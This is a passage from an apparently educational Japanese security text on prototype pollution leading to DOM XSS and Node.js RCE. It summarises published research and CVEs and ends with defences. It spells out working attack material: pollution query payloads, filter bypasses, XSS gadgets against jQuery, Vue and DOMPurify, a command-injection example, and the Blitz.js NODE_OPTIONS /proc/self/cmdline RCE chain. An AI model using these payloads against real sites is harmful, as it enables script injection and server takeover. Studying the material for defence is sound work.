merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
// → Object.prototype.isAdmin = true になってしまう
```

この`merge`関数は、キーが`__proto__`であることを一切特別扱いしていません。`target["__proto__"]`という書き方は、実際には新しいプロパティを作るのではなく、`target`のプロトタイプ（＝多くの場合`Object.prototype`そのもの）を指してしまうため、再帰の奥で`target[key][innerKey] = value`のような代入が発生した瞬間に、意図せず`Object.prototype`が書き換わります。ライブラリの深いマージ（deep merge）、クエリパラメータのネストしたパース（`a[b][c]=1`のような文字列を`{a:{b:{c:1}}}`に変換する処理）、あるいはJSONのクローン処理などが典型的な発生源です。

### なぜクライアントサイドで危険なのか

サーバーサイド（Node.jsなど）でプロトタイプ汚染が起きると、RCEやSQLインジェクションなど直接的な被害に繋がることがありますが、本章の主題であるXSSとの関係で重要なのは**クライアントサイド・プロトタイプ汚染（Client-Side Prototype Pollution, CSPP）**です。ブラウザ上のJavaScriptで`Object.prototype`が汚染されても、それ自体はコードを実行しません。攻撃が成立するには、汚染後のプロパティ値を`innerHTML`や`eval`、`<script src>`のようなDOM XSSのシンク（sink）に流し込む「橋渡し役」のコードが必要です。これを**ガジェット（gadget）**と呼びます。

つまりクライアントサイドのプロトタイプ汚染によるXSSは、次の2段階で成立します。

1. **汚染フェーズ**: URLのクエリパラメータやフラグメント（`#`以降）などユーザーが制御できる入力から、脆弱なパーサ/マージ処理を通じて`Object.prototype`に狙ったプロパティを注入する。
2. **ガジェットフェーズ**: アプリケーションやライブラリの中に、その汚染されたプロパティを読み取ってDOMに書き込む、あるいはコードとして実行するコードパスが存在し、それが実際に実行される。

汚染だけではXSSにならず、ガジェットだけでも汚染源がなければ攻撃者は起点を作れません。この両方が揃って初めて悪用可能な脆弱性になる、という点が本節のもう一つの柱です。

### s1r1us: Prototype Pollution が明らかにした実態

s1r1us（および共同研究者）による調査記事では、大規模なインターネットスキャンを通じてプロトタイプ汚染の実態を定量的に示しています。彼らは**18個の脆弱なライブラリを発見し、約80件のバグを報告**し、さらに**1000以上の脆弱サイト**を確認したとしています（ただし悪用可能なガジェットが見つからなかったものは報告に至っていない、と述べられています）。

記事が指摘する重要な知見の一つは、「**ネストされたクエリパラメータパーサーの約80%がプロトタイプ汚染に脆弱**」という調査結果です。`canjs-deparam`のような、`?a[b][c]=1`形式のクエリ文字列をネストしたオブジェクトへ変換するライブラリの多くが、キーの検証を行わずに再帰的な代入を行っていたため、`__proto__`というキーをそのまま通してしまっていました。

汚染の基本パターンとして、記事では次のようなペイロードが示されています。

```
x[__proto__][abaeead]=abaeead
x.__proto__.edcbcab=edcbcab
__proto__[eedffcb]=eedffcb
__proto__.baaebfc=baaebfc
```

これらはいずれも「ランダムな一意のプロパティ名を汚染してみて、実際にオブジェクトに現れるかどうかを確認する」ための検証用ペイロードです（ランダム文字列を使うのは、既存のプロパティ名との衝突による偽陽性を避けるためです）。

実際に本番サービスで確認されたペイロード例として、記事はApple.com（`canjs-deparam`を使用）に対する次のURLを挙げています。

```
?__proto__[src]=image&__proto__[onerror]=alert(1)
```

これは、ページ内のどこかで汚染された`src`・`onerror`プロパティが画像要素などの属性として使われるガジェットが存在した場合に、`<img src=image onerror=alert(1)>`相当の状態を作り出すというものです。同様に、Jira Service Managementに対しては次のパターンが紹介されています。

```
?__proto__.isFresh=xxx&__proto__.onmousemove=alert(1)//
```

さらに興味深いのは、開発側が`__proto__`という文字列だけを単純にフィルタリングして「修正」した場合の回避策です。フィルタが`__proto__`という完全一致・部分一致だけを見ている場合、`constructor.prototype`という別の経路からでも同じ`Object.prototype`に到達できます。

```
?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```

これは、任意のオブジェクトの`constructor`プロパティがそのオブジェクトを作った関数（多くの場合`Object`）を指しており、さらに関数の`prototype`プロパティがその関数で作られたインスタンス全体に共有されるプロトタイプオブジェクト、すなわち通常は`Object.prototype`そのものを指すためです。`__proto__`という文字列を持つキーだけをブロックする防御は、この`constructor.prototype`経由の迂回に対して無力です。

Jiraの初期修正に対しては、`__pro[]to__.div=1`のように、文字列比較を狂わせるための文字の混入によるバイパスも報告されています。またHubSpotに対する修正バイパスとして、`__proto__=&0[taint]=polluted`という、キーの解析順序や空文字列の扱いの隙を突いたパターンも紹介されています（記事はこれをNikita Stupin氏による発見として紹介しています）。

#### スクリプトガジェットの具体例

汚染そのものだけでなく、汚染された値を実際にDOM操作へ流し込む「ガジェット」側の実例も紹介されています。jQueryの内部実装では、イベント処理に関連する`handleObj.delegateTarget`のようなプロパティが十分な検証なしに扱われるケースがあり、次のようなコードパターンが引用されています。

```js
if (types && types.preventDefault && types.handleObj) {
    handleObj = types.handleObj;
    jQuery(types.delegateTarget).off(...)
}
```

このように、ライブラリ内部で「このオブジェクトはこういう形をしているはずだ」という暗黙の前提のもとにプロパティへアクセスしているコードは、`Object.prototype`が汚染されると前提が崩れ、想定外の値が流れ込む入り口になります。同様にSwiftType Searchのライブラリでは、汚染されたプロパティ値がそのまま`eval(hookFunction)`として実行されてしまう構造が指摘されています。`eval`は文字列をJavaScriptコードとして実行する関数であり、その引数が外部から汚染可能な値である時点でコード実行のガジェットとして機能します。

#### 検出手法とツール

記事では、大規模に脆弱なサイトを発見するための手法もいくつか紹介されています。

- **Seleniumベースの自動巡回ボット**によるサブドメインの一括スキャン
- **Chrome拡張機能（PPScan）**を使った、ログイン後のページなど認証が必要なエンドポイントの検査
- **CodeQL**によるJavaScriptコードの静的解析での脆弱パターン検出
- **`Object.defineProperty`のセッター（setter）をトラップとして仕込む**手法。これは、疑わしいプロパティに書き込みが発生した瞬間に検知できるようにする、いわば「動的な監視カメラ」です
- Filedescriptorによる**untrusted-types拡張機能**を使い、実際にどのDOM APIのシンクに汚染データが到達するかをログとして記録する手法

これらは後述するBurp Suiteの**DOM Invader**（本章の別セクションで扱う汚染追跡機能）とも同じ発想、すなわち「怪しいプロパティへの書き込み・読み出しをフックして流れを可視化する」というアプローチです。

#### 防御策

記事が挙げる防御策は次の通りです。

1. **キーのブラックリスト/検証**: オブジェクトへの動的代入を行う前に、キーが`__proto__`・`prototype`・`constructor`を含んでいないかを確認して拒否する。
2. **Node.jsのランタイムオプション**: `--disable-proto`フラグを付けて起動すると、`Object.prototype.__proto__`アクセサ自体を無効化できる。
3. **将来的な仕様**: `Object.freeze(Object.prototype)`を強制するための**Document Policy**のような、ブラウザ側の宣言的な防御の議論が進んでいる（凍結されたオブジェクトはプロパティの追加・変更ができなくなる）。

これらはいずれも「汚染フェーズ」を断つ対策です。加えて、汚染フェーズを完全に防げなくても、`Object.create(null)`で作った「プロトタイプを持たないオブジェクト」を辞書的な用途に使う、あるいは`Map`型（プロトタイプ経由の継承を持たないキー・バリューストア）を使うといった設計変更も、実務上有効な緩和策として広く知られています。

> 出典: s1r1us: Prototype Pollution — https://blog.s1r1us.ninja/research/PP

### BlackFan: client-side-prototype-pollution ガジェット集

汚染フェーズの手口が分かっても、実際に悪用するには「そのプロパティを読んでDOMに書き込むコード」＝ガジェットが必要です。BlackFan氏が公開しているリポジトリ`client-side-prototype-pollution`は、実世界の著名なJavaScriptライブラリの中から見つかったガジェットを、ライブラリ別・脆弱性別に整理したカタログです。構成は大きく次の2つに分かれています。

- **`pp/`**: プロトタイプ汚染そのものを引き起こせる脆弱なライブラリ（パーサやマージ関数など、汚染フェーズを担当する側）の一覧
- **`gadgets/`**: 汚染された値を実際にXSS等の実行に変換するガジェット（実行フェーズを担当する側）の一覧

汚染フェーズ側の代表例として、リポジトリでは複数のjQueryプラグインやユーティリティにCVE番号付きで脆弱性が記録されています。

| ライブラリ | ペイロード例 | CVE |
|---|---|---|
| jQuery query-object | `?__proto__[test]=test` | CVE-2021-20083 |
| jQuery Sparkle | `?__proto__.test=test` | CVE-2021-20084 |
| backbone-query-parameters | `?__proto__.test=test` | CVE-2021-20085 |
| jQuery BBQ | `?__proto__[test]=test` | CVE-2021-20086 |
| jquery-deparam | `?__proto__[test]=test` | CVE-2021-20087 |
| MooTools More | `?__proto__[test]=test` | CVE-2021-20088 |
| Purl | `?__proto__[test]=test` | CVE-2021-20089 |

これらはいずれも、URLのクエリ文字列やハッシュフラグメントを「ネストしたオブジェクト」にパースするユーティリティで、キー名に対する検証（`__proto__`や`constructor`の除外）が欠けていたために2021年前後に相次いでCVE番号が割り当てられました。攻撃者から見ると、これらのライブラリがページ内で読み込まれているかどうかを確認するだけで、汚染フェーズの手段が一つ確保できることになります。

実行フェーズ、すなわちガジェット側の具体例としては、次のようなものが紹介されています。

**jQuery `$.get`（3.0.0以降）を使ったガジェット:**

```
?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
```

これは、Ajax呼び出しのオプションを解決する内部処理が、明示的に指定されていない`dataType`（レスポンスの解釈方法）などのオプションを、汚染された`Object.prototype`から拾ってしまうことを利用しています。`dataType`を`script`に固定されると、取得したレスポンス本体（ここでは`data:`スキームでインラインに埋め込んだ`alert(1)`）がスクリプトとして評価されてしまいます。

**Google reCAPTCHA読み込み時のガジェット:**

```
?__proto__[srcdoc][]=<script>alert(1)</script>
```

`srcdoc`は`<iframe>`要素にインラインでHTMLを与えるための属性です。汚染された`srcdoc`プロパティがそのままiframeの初期HTMLとして使われてしまうと、`<script>`タグを含む任意のHTMLがそのiframeのコンテキストで解釈・実行されます。

**Vue.jsのテンプレートエンジンを使ったガジェット:**

```
?__proto__[template]=<script>alert(1)</script>
```

Vue.jsのようなテンプレートエンジンでは、コンポーネントの`template`オプションが直接HTMLとしてコンパイル・レンダリングされます。もし何らかの初期化コードが、明示的に渡されなかった場合の`template`のデフォルト値をオブジェクトのプロパティ探索（＝プロトタイプチェーンをたどる探索を含む）で解決しているなら、汚染された`template`プロパティがそのままレンダリングされ、DOM XSSに直結します。

**DOMPurify（2.0.12以前）に対するガジェット:**

```
?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src
```

DOMPurifyはHTMLをサニタイズ（無害化）するためのライブラリで、許可する属性のホワイトリストを`ALLOWED_ATTR`という設定オブジェクトで管理しています。この設定がユーザー設定とデフォルト設定のマージによって組み立てられる実装だった場合、`Object.prototype.ALLOWED_ATTR`を汚染することで、サニタイザー自身の許可リストに`onerror`や`src`のような危険な属性を追加させることができます。これは「サニタイザーを迂回する」のではなく「サニタイザーの設定そのものを書き換えて無害化の基準を緩める」という、プロトタイプ汚染に特有の攻撃パターンです。DOMPurifyはこの種の設定汚染に対応するため、以降のバージョンで設定のマージ処理を強化しています。

これらのガジェットに共通する原理は、いずれも「オプション（設定）オブジェクトの未指定プロパティを、暗黙のうちにプロトタイプチェーン経由のデフォルト値として扱ってしまうコード」です。JavaScriptでは、関数の引数として渡されたオプションオブジェクトに特定のキーが存在しない場合、`options.someFlag`のような参照はプロトタイプチェーンをたどって`undefined`ではない値を返すことがあり、ライブラリの実装者がこれを意図していなくても攻撃者が意図的に用意した値を「デフォルト値のように見せかけて」注入できてしまいます。

リポジトリのREADMEでは、これらのガジェットカタログはペネトレーションテストや脆弱性調査における参考資料として位置づけられており、各エントリにはファイルパス付きで脆弱なコード箇所への言及が整理されています。汚染フェーズのCVE群と実行フェーズのガジェット群を突き合わせることで、「あるページでどのライブラリが読み込まれているか」から「悪用可能かどうか」を素早く判断できるようにする、辞書的なリファレンスとしての性格が強いリポジトリです。

> 出典: BlackFan: PPガジェット集 — https://github.com/BlackFan/client-side-prototype-pollution

### まとめ：汚染とガジェットの二段構え

本節で見てきたように、クライアントサイド・プロトタイプ汚染によるXSSは「プロパティ名の検証漏れ（汚染フェーズ）」と「オブジェクトの形状を無条件に信頼するコード（ガジェットフェーズ）」という、独立した2つの弱点が組み合わさって初めて成立します。したがって攻撃者視点では、対象サイトがどのライブラリを読み込んでいるかをまず特定し（フィンガープリンティング）、そのライブラリが上記のようなCVEやガジェットカタログに載っていないかを照合する、という手順が典型的な調査フローになります。次節以降では、この汚染とガジェットの組み合わせをブラウザ上で自動的に探索してくれるツールである**DOM Invader**を使った実践的な検出方法を扱います。

---

## プロトタイプ汚染 実践とRCE事例

前節（s4f）では、プロトタイプ汚染（prototype pollution）の原理 ―― `Object.prototype` に攻撃者が任意プロパティを書き込むと、そのプロセス内のほぼ全オブジェクトがその値を「継承」してしまう ―― と、汚染をXSSやRCEに変換する「ガジェット」というカタログを概観しました。本節はその続きで、実際に **どうやって汚染を仕込み（source）、どうやってそれを実害に着火させるか（sink/gadget）** という攻撃の一連の流れを、クライアントサイドのDOM XSSからサーバサイドのRCE（remote code execution、遠隔任意コード実行）まで、具体的な事例とペイロードで追いかけます。

プロトタイプ汚染は「単体では何も起きない脆弱性」である点が特徴です。`Object.prototype.foo = 'x'` を実現できても、その `foo` を読み取って危険な処理を行うコード（ガジェット）がアプリやライブラリのどこかに存在しなければ、攻撃は成立しません。したがって実践では常に **「汚染の入口（source）」×「着火点（gadget/sink）」の二段構え** で考えます。本節はこの二段を、原典のペイロードを引用しながら組み立てていきます。

> 学習の前提: 本節はラボの解答手順そのものではなく、脆弱性クラスの原理・攻撃面・防御を理解するための解説です。攻撃コードは「なぜ動くのか」を説明するために掲げます。

---

### 汚染の入口（source）を体系的に理解する

クライアントサイドで最も一般的な汚染の入口は、**攻撃者が制御できる文字列（URLのクエリ・フラグメント、`postMessage` で届くJSON、`localStorage` の値など）を、キー名を検証せずにオブジェクトへ展開するコード** です。代表的なアンチパターンは三つあります。

#### (1) クエリ文字列パーサ（bracket記法の展開）

Beyond XSS が示す典型的な脆弱パーサは、`a[b][c]=1` のようなネストしたキーをオブジェクトに再構築します。

```javascript
function parseQs(qs) {
  let result = {};
  let arr = qs.split("&");
  for (let item of arr) {
    let [key, value] = item.split("=");
    let items = key.split("[");
    let obj = result;
    for (let i = 0; i < items.length; i++) {
      let objKey = items[i].replace(/]$/g, "");
      if (i === items.length - 1) {
        obj[objKey] = value;          // 最終要素だけ代入
      } else {
        if (typeof obj[objKey] !== "object") {
          obj[objKey] = {};           // 途中は空オブジェクトを作って潜る
        }
        obj = obj[objKey];
      }
    }
  }
  return result;
}
var qs = parseQs("__proto__[a]=3");
```

**なぜ汚染できるのか。** キー `__proto__[a]` は `["__proto__", "a]"]` に分割され、ループの1周目で `obj = result["__proto__"]` を取得します。ここで `result["__proto__"]` は `result` の *プロトタイプ* すなわち `Object.prototype` を指すため、以後 `obj` は `Object.prototype` になります。2周目で `obj["a"] = "3"`、つまり `Object.prototype.a = "3"` が実行される。以後、このページ内で作られるあらゆる普通のオブジェクト `x` は、自分自身に `a` を持たなくても `x.a` を読むと `"3"` を返すようになります。これが「汚染」です。攻撃URLは `https://victim/?__proto__[a]=3` のように、ユーザー操作なしに送りつけられます。

> 出典: Beyond XSS — Prototype Pollution — https://aszx87410.github.io/beyond-xss/en/ch3/prototype-pollution/

#### (2) 再帰的マージ（deep merge / merge）

設定オブジェクトにユーザ設定を「深く合成」する `merge` 系関数も定番の入口です。

```javascript
function merge(a, b) {
  for (let prop in b) {
    if (typeof a[prop] === "object") {
      merge(a[prop], b[prop]);        // 子オブジェクトを再帰的に合成
    } else {
      a[prop] = b[prop];
    }
  }
}
var customConfig = JSON.parse('{"__proto__": {"a": 1}}');
merge(config, customConfig);
```

**なぜ汚染できるのか。** `for...in` は列挙可能プロパティを回します。`JSON.parse` で作られたオブジェクトの `__proto__` は（リテラルと違い）**通常の自前プロパティとして** `{"a":1}` を保持しています。`merge` はこれを `typeof a["__proto__"] === "object"` と判定して再帰に入り、`a["__proto__"]`（= `Object.prototype`）に対して `a = 1` を書き込みます。`lodash.merge` の旧版をはじめ、多数のライブラリが同型のバグで CVE を出しました。ポイントは **`JSON.parse` 経由だと `__proto__` がデータとして通る** ことで、これが後述のサーバサイド攻撃でも鍵になります。

> 出典: Beyond XSS — Prototype Pollution — https://aszx87410.github.io/beyond-xss/en/ch3/prototype-pollution/

#### (3) パス指定代入（`set(obj, "a.b.c", value)`）

`lodash.set` のように「`a.b.c` という文字列パスで深い位置へ代入する」ユーティリティも、パスに `__proto__.x` や `constructor.prototype.x` を渡されると汚染します。この形式は特に **サーバサイド** のデシリアライズやORM、フォーム処理で頻出し、後述の Blitz.js の RCE がまさにこの型です。

---

### 代替ベクタ ―― `__proto__` を弾かれても汚染する

防御側は往々にして「キーが `__proto__` だったら拒否」というブラックリストを書きます。しかしプロトタイプチェーンには `__proto__` 以外の入口があり、さらにブラックリスト自体の実装ミスも突けます。

- **`constructor.prototype` 経由**: 任意オブジェクト `o` について `o.constructor` は生成元コンストラクタ（`Object`）を、`o.constructor.prototype` は `Object.prototype` を指します。したがって `obj["constructor"]["prototype"]["a"] = 1` は `__proto__` を一切使わずに同じ汚染を達成します。クエリなら `?constructor[prototype][a]=1` です。

  ```javascript
  obj["constructor"]["prototype"]["a"] = 1;  // __proto__ を使わない汚染
  ```

- **不完全なサニタイズの潰し込み**: 「文字列から `__proto__` を1回だけ除去する」実装は、`__pro__proto__to__` のような入力を1回除去すると中央の `__proto__` が消えて残った両端が結合し、`__proto__` に戻ってしまいます。除去は「一致しなくなるまで繰り返す」か、そもそもキーの完全一致で拒否する必要があります。

> 出典: PortSwigger Web Security Academy — Client-side prototype pollution — https://portswigger.net/web-security/prototype-pollution/client-side

---

### 汚染をDOM XSSに変える（クライアントサイドのガジェット）

入口を確保したら、次はそのプロパティを読んで危険な副作用を起こす **ガジェット** を探します。ガジェットは「本来は自前で持っていないはずのオプションを、コードが `if (config.xxx)` のように確認してしまう」箇所に潜みます。

#### 素朴な例 ―― 存在チェックの裏をかく

HackTricks が挙げる最小例です。

```javascript
Object.prototype.innerHTML = "<img src=x onerror=alert(1)>";
function createElement(config) {
  const element = document.createElement(config.tag);
  if (config.innerHTML) {          // 汚染により常に truthy
    element.innerHTML = config.innerHTML;   // sink: 汚染値がそのまま入る
  } else {
    element.innerText = config.innerText;   // 本来通るはずの安全な枝
  }
  return element;
}
```

**なぜ動くのか。** 呼び出し側は `config` に `innerHTML` を入れていないため、開発者は「安全な `innerText` 側が実行される」と信じています。しかし `Object.prototype.innerHTML` を汚染しておくと `config.innerHTML` が継承値で truthy になり、危険な `innerHTML` 側の枝が選ばれ、しかもその値は攻撃者制御の HTML です。`onerror` により `alert(1)` 相当のスクリプトが走ります。これが「安全なはずの分岐」を汚染で反転させるガジェットの本質です。

#### テンプレートエンジン・サニタイザのガジェット

- **Vue.js**: `Object.prototype.template = "<svg onload=alert(1)></svg>"` を汚染しておくと、`new Vue({el:"#app", data:{...}})` がインスタンスオプションから `template` を拾い、その中身をコンパイルして実行します（`template` はスクリプト実行に等しい）。
- **sanitize-html のバイパス**: `Object.prototype.innerText = "<svg onload=alert(1)></svg>"` の汚染下で `document.write(sanitizeHtml("<div>hello</div>"))` を実行すると、サニタイザが内部で参照する `innerText` 継承値が出力に混ざり、消毒を経ずに危険タグが出ます。

```javascript
Object.prototype.template = "<svg onload=alert(1)></svg>";
new Vue({ el: "#app", data: { message: "Hello" } });
```

> 出典: HackTricks — Client-side prototype pollution — https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html

#### 実在ライブラリの「野生のガジェット」

PortSwigger の研究 *Widespread prototype pollution gadgets* は、広く使われる解析タグ/ライブラリに実在する具体的ガジェットを列挙しました。汚染するプロパティ名と、それが流れ込む sink の対応が重要です。

| ライブラリ | 汚染プロパティ | sink（着火点） | 効果 |
|---|---|---|---|
| Google Analytics | `hitCallback` | `setTimeout` | コールバックとして関数文字列が実行 → DOM XSS |
| Google Tag Manager | `sequence` | `eval` | 整数と並ぶJS式に混入 → コード実行 |
| Google Tag Manager | `event_callback` | `setTimeout` | 同上 |
| Adobe DTM | `cspNonce` | `innerHTML` | HTMLに混入 → DOM XSS |
| Adobe DTM | `bodyHiddenStyle` | `innerHTML` | 同上 |
| Adobe DTM | `trackingServerSecure` | `script.src` | ホスト部を制御 → 外部スクリプト読み込み |

**`script.src` ガジェットの意味。** `trackingServerSecure` を汚染すると、タグが動的に生成する `<script>` の `src` のホスト部を攻撃者が乗っ取れます（プロトコルは固定でも、任意ホストからJSを読める）。これは **CSP を回避する経路** にもなり得ます。CSP（Content Security Policy）が信頼済みホストを `script-src` に許可している場合、そのホストに攻撃者のJSを置ければ実行できてしまうためです（CSPは「どこから読むか」を制限するだけで、汚染で行き先が信頼済みホストにすり替わることまでは防げません）。

> 出典: PortSwigger Research — Widespread prototype pollution gadgets — https://portswigger.net/research/widespread-prototype-pollution-gadgets

#### 実戦での検出 ―― DOM Invader

手作業では「効く source を総当たりし、続いて `Object.prototype` を読む gadget を探す」という二段の探索になり、時間がかかります。Burp Suite の **DOM Invader** はこれを自動化します。URL と、web message（`postMessage`）で届くJSON の両方から source を自動検出し、代替ベクタ（`constructor.prototype` 等）も試します。さらにガジェット走査を行い、source・gadget・sink を結合して **DOM XSS の PoC を自動生成** できる場合があります。これにより、実サイトの調査が「数時間」から「数秒」へ短縮されます。防御の観点では「ブラウザAPIを呼ぶ際は null プロトタイプのオブジェクト（`Object.create(null)`）を使う」ことが有効な多層防御になります。

> 出典: PortSwigger — Testing for client-side prototype pollution (DOM Invader) — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution

---

### 実世界のクライアントサイド事例

- **HackerOne / Wistia embed（2020）**: 脆弱な `url.parse()` で `location.href` を解析する過程でプロトタイプ汚染が発生。Wistia 埋め込みの `fromObject()` ガジェットが、汚染された `innerHTML` を含む DOM プロパティを設定してしまい、DOM XSS に到達しました。**「解析ライブラリの汚染」×「埋め込みウィジェットのガジェット」** という典型的な二段構えです。
- **Kibana CVE-2019-7609**: Timelion 機能で `.es.props(label.__proto__.x='ABC')` の形で `Object.prototype` を汚染でき、これを環境変数ガジェットと組み合わせ、`NODE_OPTIONS="--require /proc/self/environ"` を成立させて **サーバ上で任意コマンド実行** に到達しました。クライアント式の汚染入口からサーバRCEへ橋渡しした古典例です（この `NODE_OPTIONS`/`/proc/self` の技法は次のBlitz.jsでも中核になります）。

> 出典: HackTricks — Client-side prototype pollution — https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html

---

### サーバサイドRCE事例 ―― Blitz.js（CVE-2022-23631）

クライアントサイドの汚染は多くがDOM XSSどまりですが、**Node.js サーバでの汚染は RCE に直結しうる** 点で危険度が段違いです。Sonar が公開した Blitz.js の解析は、その完全な攻撃連鎖（source からRCEまで）を示す教科書的事例です。

#### 対象と修正状況

- **CVE**: CVE-2022-23631（脆弱性は依存する `superjson` シリアライズライブラリにあった）
- **影響版**: `superjson` < 1.8.1、Blitz.js < 0.45.3
- **修正版**: `superjson` 1.8.1、Blitz.js 0.45.3（公開: 2022年）
- **前提**: RPC を1つでも持つ Blitz.js アプリなら、**認証不要・ユーザ操作不要でリモートから** 成立しうる

#### 入口 ―― superjson の `referentialEqualities`

Blitz.js の RPC は、JSと同じ型情報（Date/Map/循環参照など）を保つために `superjson` でデータをシリアライズします。superjson は本体データ `json` とは別に、`meta.referentialEqualities` という **「このパスとこのパスは同じ参照だから、代入で結び直せ」という指示表** を持ちます。復元時、この指示に従って **パス文字列による代入** が行われます。記事の説明では、指示 `products[0].brand = brands[0]` 相当の代入が、パスの検証なしに実行されます。

攻撃者が RPC エンドポイントへ送る悪性ペイロードは次の構造を取ります。

```json
{
  "json": { /* 攻撃者が制御するデータ本体 */ },
  "meta": {
    "referentialEqualities": {
      "__proto__.x": ["some.path"]
    }
  }
}
```

**なぜ汚染できるのか。** superjson は指示表のキー `"__proto__.x"` を「代入先パス」として解釈し、`json.__proto__.x = (some.path の値)` を実行します。`json.__proto__` は `Object.prototype` なので、これは `Object.prototype.x = 攻撃者制御値` に等しい。前述の「パス指定代入(3)」の型そのものが、信頼できない入力（RPC本文）で駆動される状況です。

> 出典: Sonar — Prototype Pollution in Blitz.js Leads to RCE — https://www.sonarsource.com/blog/blitzjs-prototype-pollution/

#### 着火 ―― RCEへの三段ガジェット連鎖

汚染だけではまだRCEになりません。Sonar は Next.js/Blitz の実行環境に潜む3つのガジェットを連結しました。

1. **pages manifest の汚染**: Next.js はページ一覧（pages manifest）を参照して該当モジュールを `require()` で読み込みます。この参照はプロトタイプ継承されたプロパティも拾うため、汚染で **存在しないはずのエントリを注入** でき、`require()` の対象（実行されるファイル）を攻撃者が操作できます。
2. **CLI ラッパの子プロセス生成**: 経路の先に、Blitz の CLI ラッパが `spawn()` で子プロセスを起動する箇所があります。`spawn()` のオプション引数（第3引数のオブジェクト）は、明示指定がなければ `Object.prototype` から継承した値を拾います。
3. **`spawn` オプションの汚染 → 引数・環境変数注入**: 汚染で `spawn` の `env`（環境変数）や `argv0`（プロセスの見かけ上の引数0）を制御します。

最終的に、次のような子プロセス起動へ持ち込みます。

```
execve("/proc/self/exe",
       ["console.log('pwned!');//", "-c", "node …"],
       { NODE_OPTIONS: "--require /proc/self/cmdline" })
```

**なぜこれでコードが走るのか。** ここが技法の核心です。

- `NODE_OPTIONS=--require /proc/self/cmdline` は「Node起動時に `/proc/self/cmdline` を必ず require せよ」という指示です。
- Linux の `/proc/self/cmdline` は **その実行中プロセス自身のコマンドライン引数** をヌル区切りで返す擬似ファイルです。`argv0` に `console.log('pwned!');//` を仕込んでおくと、`require` されるファイルの先頭に攻撃者のJSが現れます。
- `require` された内容は Node が **JavaScript として実行** するため、`console.log('pwned!')` が走ります。後続の引数は `//` でコメントアウトされ、構文エラーを避けます。

つまり「起動引数として渡した文字列を、`/proc/self/cmdline` 経由で自分自身に `require` させて実行する」という自己参照トリックで、**環境変数と引数の制御だけからコード実行** を達成しています（Kibana の `/proc/self/environ` と同系統の発想です）。結果は **認証不要のサーバ上任意コード実行** です。

> 出典: Sonar — Prototype Pollution in Blitz.js Leads to RCE — https://www.sonarsource.com/blog/blitzjs-prototype-pollution/

#### Node.jsの汎用RCEガジェット（child_process）

Blitz.js のような複雑な連鎖でなくても、`child_process` のオプション汚染は単体で危険です。HackTricks の例:

```javascript
Object.prototype.shell = true;
const result = child_process.spawnSync("echo", ["123 && ls"], { timeout: 1000 });
// shell:true 継承により、echo の引数がシェル解釈され && ls が実行される
```

**なぜ動くのか。** `spawnSync` に `shell` を明示していないため、`shell` は `Object.prototype` から継承した `true` になります。`shell:true` だと引数が `/bin/sh -c` に渡され、`123 && ls` の `&& ls` がコマンド連結として実行されます。Node製アプリで「外部コマンドを固定引数で呼んでいるから安全」という思い込みを、汚染が崩す好例です。同様に `fetch` は `body`/`method` の汚染でGETをPOSTに変えられます。

> 出典: HackTricks — Client-side prototype pollution — https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html

---

### 防御 ―― 入口を塞ぎ、着火を無効化する

プロトタイプ汚染対策は「source を塞ぐ」「gadget/sink を無効化する」の両面で行います。

- **危険キーの完全拒否**: マージ/パース/パス代入で `__proto__`・`constructor`・`prototype` を**完全一致で**弾く。Blitz.js の修正はまさにパスで使えるプロパティ名からこの3つを禁止しました。前述の `__pro__proto__to__` を避けるため、除去ではなく拒否を選ぶこと。
- **null プロトタイプのオブジェクトを使う**: `const obj = Object.create(null)` はプロトタイプチェーンを持たないため、`obj.__proto__.a = 1` は汚染に至らず、また `obj.x` が継承値を拾うこともありません。設定オブジェクトやブラウザAPIに渡すオプションに有効。
- **`Object.freeze(Object.prototype)`**: プロトタイプを凍結すると `Object.prototype.a = 1` は（strictでなければ）静かに失敗し、汚染が成立しません。ただし `Object.prototype` を書き換える正当なコードがあると壊れるため互換性検証が必要。
- **Node.js 起動フラグ `--disable-proto`**: `--disable-proto=delete`/`=throw` で `__proto__` アクセサ自体を無効化・例外化できる。ただし `constructor.prototype` 経路は別途塞ぐ必要がある点に注意。
- **スキーマ検証**: `Map` を使う、`JSON.parse` の reviver で許可キーのみ通す、あるいは Zod 等でRPC/入力を検証するなど、そもそも任意キーを受け付けない設計にする。
- **多層防御としてのCSP**: `script.src` ガジェットのように汚染がスクリプト読み込みへ流れる経路に対し、CSP の `script-src` を厳格化すると被害を限定できる（ただし信頼済みホストに攻撃者JSを置ける場合は回避されうるため、CSP単体を頼りにしない）。

> 出典: Beyond XSS — Prototype Pollution — https://aszx87410.github.io/beyond-xss/en/ch3/prototype-pollution/ / Sonar — Prototype Pollution in Blitz.js Leads to RCE — https://www.sonarsource.com/blog/blitzjs-prototype-pollution/

---

### まとめ

- プロトタイプ汚染は **単体では無害**。実害は必ず「汚染の入口（source）」×「着火点（gadget/sink）」の連鎖で生じる。
- 入口の三大アンチパターンは **bracketクエリ展開・再帰マージ・パス指定代入**。`__proto__` を弾かれても `constructor.prototype` や不完全サニタイズの潰し込みで回避されうる。
- クライアントサイドでは Google Analytics（`hitCallback`→`setTimeout`）や Adobe DTM（`trackingServerSecure`→`script.src`）のような **実在ガジェット** がDOM XSS・CSP回避に繋がる。DOM Invader で source×gadget×sink のPoCを自動生成できる。
- サーバサイド（Node.js）では危険度が一段上がり、**Blitz.js（CVE-2022-23631）** は superjson の `referentialEqualities` を入口に、pages manifest 汚染・`spawn` オプション汚染・`NODE_OPTIONS=--require /proc/self/cmdline` を連鎖させ、**認証不要のRCE** に到達した。
- 防御は「危険キーの完全拒否」「null プロトタイプ」「`Object.freeze`」「`--disable-proto`」「スキーマ検証」を組み合わせ、入口と着火の両方を塞ぐ。

---

## DOM Clobbering

### 概要:「スクリプトなしのXSS」という一見矛盾した攻撃

